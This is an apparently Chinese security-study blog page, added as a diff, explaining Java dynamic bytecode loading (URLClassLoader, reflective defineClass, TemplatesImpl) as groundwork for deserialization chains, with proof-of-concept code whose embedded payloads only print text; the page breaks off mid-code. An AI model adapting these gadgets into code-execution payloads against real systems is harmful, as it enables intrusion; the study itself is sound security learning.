@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="继续跟着P师傅学习Java安全，这一篇动态字节码加载作为补充，为CC3的讲解做了铺垫。重点讲了一下TemplatesImpl这个类，在Fastjson等漏洞中出镜率非常高。先跟着P师傅认识下Java中支持动态加载“字节码”的方法。 什么是Java的字节码严格的讲，Java字节码(ByteCode)仅仅指Java虚拟机执行使用的一类指令，通常被存储在.class文件中。不同平台，不同CPU的计算机指">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全漫谈-动态加载字节码">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;11&#x2F;28&#x2F;Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="继续跟着P师傅学习Java安全，这一篇动态字节码加载作为补充，为CC3的讲解做了铺垫。重点讲了一下TemplatesImpl这个类，在Fastjson等漏洞中出镜率非常高。先跟着P师傅认识下Java中支持动态加载“字节码”的方法。 什么是Java的字节码严格的讲，Java字节码(ByteCode)仅仅指Java虚拟机执行使用的一类指令，通常被存储在.class文件中。不同平台，不同CPU的计算机指">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;28&#x2F;VItp4XvKUnZCW7y.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;30&#x2F;XMQiGTYAxWOEzRf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;30&#x2F;7GvhsPtAizjIVRE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;30&#x2F;n7oLeQVvS1q6HCb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;30&#x2F;e1z5gRXT6S29u8U.png">
+<meta property="og:updated_time" content="2021-11-30T16:50:37.637Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;28&#x2F;VItp4XvKUnZCW7y.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/11/28/Java安全漫谈-动态加载字节码/"/>
+
+
+
+
+
+  <title>Java安全漫谈-动态加载字节码 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/28/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java安全漫谈-动态加载字节码</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-28T10:05:36+08:00">
+                2021-11-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>继续跟着P师傅学习Java安全，这一篇动态字节码加载作为补充，为CC3的讲解做了铺垫。<br>重点讲了一下TemplatesImpl这个类，在Fastjson等漏洞中出镜率非常高。<br>先跟着P师傅认识下Java中支持动态加载“字节码”的方法。</p>
+<h2 id="什么是Java的字节码"><a href="#什么是Java的字节码" class="headerlink" title="什么是Java的字节码"></a>什么是Java的字节码</h2><p>严格的讲，Java字节码(ByteCode)仅仅指Java虚拟机执行使用的一类指令，通常被存储在.class文件中。<br>不同平台，不同CPU的计算机指令有差异，但是Java是一门跨平台的编译型语言，这些差异对上层开发者来说是透明的。<br>上层开发者只需要将自己的代码编译一次，就可以在不同平台的JVM虚拟机中运行它们。开发者甚至可以用Scala，Kotlin这样的语言编写代码，<br>只要编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行。<br><img src="https://i.loli.net/2021/11/28/VItp4XvKUnZCW7y.png" alt="1.png"><br>在这里，P师傅所说的“字节码”可以理解更广义一些–<strong>所有能够恢复成一个类并在JVM虚拟机里加载的字节序列，都在探讨范围之内</strong></p>
+<h2 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h2><p>Java的ClassLoader是用来加载字节码文件最基础的方法，在P师傅Java安全漫谈系列开头的反射篇中有提到过</p>
+<blockquote>
+<p>ClassLoader是什么呢？就是一个“加载器”，告诉Java虚拟机如何加载这个类。Java默认的ClassLoader就是根据类名来加载类，<br>这个类名是类的完整路径，例如java.lang.Rruntime</p>
+</blockquote>
+<p>ClassLoader的概念不是三言两语就能说得清楚的，P师傅也没有深入分析，直接介绍了URLClassLoader这个ClassLoader。<br>URLClassLoader实际上是平时默认使用的AppClassLoader的父类，所以解释URLClassLoader的工作过程实际就在解释默认的Java类加载器的工作流程。<br>正常情况下，Java会根据配置项<code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径(这些路径是经过处理后的java.net.URL类)来寻找.class文件来加载。这个基础路径又分为三种情况：</p>
+<ol>
+<li>URL未以斜杠/结尾，这种情况认为是JAR文件，使用JarLoader来寻找类，即为在jar包中寻找.class文件</li>
+<li>URL以斜杠/结尾，且协议名是file,则使用FileLoader来寻找类，即为在本地文件系统中寻找.class文件</li>
+<li>URL以斜杠/结尾，且协议名不是file,那么使用最基础的Loader来寻找类。</li>
+</ol>
+<p>正常开发通常遇到的都是前面两点，什么时候才会出现使用Loader寻找类的情况呢？当然是非file协议的时候，最常见的就是http协议。<br>用P师傅给出的例子看看能否从远程HTTP服务器加载类文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClassLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8000/"</span>)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(<span class="string">"Hello"</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译一个Hello文件</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后启动python自带的http模块下的server.py<code>python -m http.server</code><br>把Hello.class拷贝到启动python服务器命令的路径下，然后再运行URLClassLoader的demo<br>发现成功请求到了Hello.class,并且idea输出了Hello<br><img src="https://i.loli.net/2021/11/30/XMQiGTYAxWOEzRf.png" alt="1.png"></p>
+<h2 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h2><p>上面说到了利用URLClassLoader加载远程class文件，也就是加载字节码。其实不管是加载远程的class文件还是本地的class或者jar文件，Java都经历的是下面三个方法的调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader#loadClss ---&gt; ClassLoader#findClass ---&gt; ClassLoader#defineClass</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<ul>
+<li>loadClass的作用是从已加载的类缓存，父加载器等位置寻找类(这里实际是双亲委派机制，什么是双亲委派机制<a href="https://www.jianshu.com/p/1e4011617650" target="_blank" rel="noopener">传送门</a>),在loadClass没找到类的情况下，执行findClass。</li>
+<li>findClass的作用是根据基础RUL指定的方式加载类的字节码，就像上面URLClassLoader部分讲到的一样，可能会在本地文件系统，jar包或远程http服务器上读取字节码，然后交给defineClass</li>
+<li>defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
+</ul>
+<p>真正核心的部分其实是defineClass，它决定了如何将一段字节流转变成一个Java类，Java默认的ClassLoader#defineClass是一个native方法，逻辑在JVM的C语言代码中。<br>这里用P师傅给出的代码，演示如何让系统的defileClass直接加载字节码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloDefineClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass =</span><br><span class="line">                ClassLoader.class.getDeclaredMethod("defineClass", String.class,</span><br><span class="line">                        <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM"</span>);</span><br><span class="line">                        Class hello =</span><br><span class="line">                                (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">"Hello"</span>, code,</span><br><span class="line">                                        <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式调用它的构造函数，初始化代码才能被执行。而且，即使将初始化代码放在类的static块中，在defineClass的时候也无法被直接调用到。所以如果要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。<br>执行上面的demo，输出了Hello World.<br><img src="https://i.loli.net/2021/11/30/7GvhsPtAizjIVRE.png" alt="1.png"><br>这里因为系统的ClassLoader#defineClass是一个保护属性所以无法在外部直接访问，不得不使用反射的形式调用。在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它确是常用的一个攻击链TemplatesImpl的基石。</p>
+<hr>
+<h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>虽然大部分上层开发者用不到defineClass方法，但是Java底层还是有一些类用到了它(否则也没存在的必要了)，其中就有TemplatesImpl。<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="keyword">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent, Map&lt;String, Class&lt;?&gt;&gt; mapEF) &#123;</span><br><span class="line">            <span class="keyword">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">                ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class&lt;?&gt; defineClass(<span class="keyword">final</span> <span class="keyword">byte</span>[] b) &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; defineClass(<span class="keyword">final</span> <span class="keyword">byte</span>[] b, ProtectionDomain pd) &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length, pd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这个类重写了defineClass方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。所以也就是说这里的defineClass由其父类的protected类型变为了一个default。也就是说这里的defineClass由其父类的protected类型变成了一个default类型，可以被类外部调用。可以从TransletClassLoader#defineClass()向前追溯一下调用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">    TemplatesImp#newTransformer()</span><br><span class="line">        TemplatesImpl#getTransletInstance()</span><br><span class="line">            TemplatesImpl#defineTransletClasses()</span><br><span class="line">                TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+<p>追到最前面两个方法<code>TemplatesImpl#getOutputProperties()</code>和<code>TemplatesImpl#newTransformer()</code>，这两者的作用域是pbulic，可以被外部调用。尝试用newTransformer()构造一个简单的poc：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTemplatesImpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="keyword">byte</span>[] code =</span><br><span class="line">                Base64.getDecoder().decode(<span class="string">"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE="</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_name"</span>, <span class="string">"HelloTemplatesImpl"</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个是P师傅给的例子，运行后输出了一串字符串，随后异常退出。如图<br><img src="https://i.loli.net/2021/11/30/n7oLeQVvS1q6HCb.png" alt="1.png"><br>这个demo里面，setFieldValue方法用来设置私有属性，上面设置了三个属性：<code>_bytecodes</code>,<code>_name</code>,<code>_tfactory</code>.<code>_bytecodes</code>是由字节码组成的数组；<code>_name</code>可以是任意字符串，只要不为null即可；<code>_tfactory</code>需要是一个TransformerFactoryImpl对象，因为TemplatesImpl#defineTransletClasses()方法有调用到<code>_tfactory.getExternalExtensionsMap()</code>，如果是null会出错。另外，值得注意的是，TemplatesImpl中对加载字节码是有一定要求的，这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。所以，需要构造一个特殊的类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> 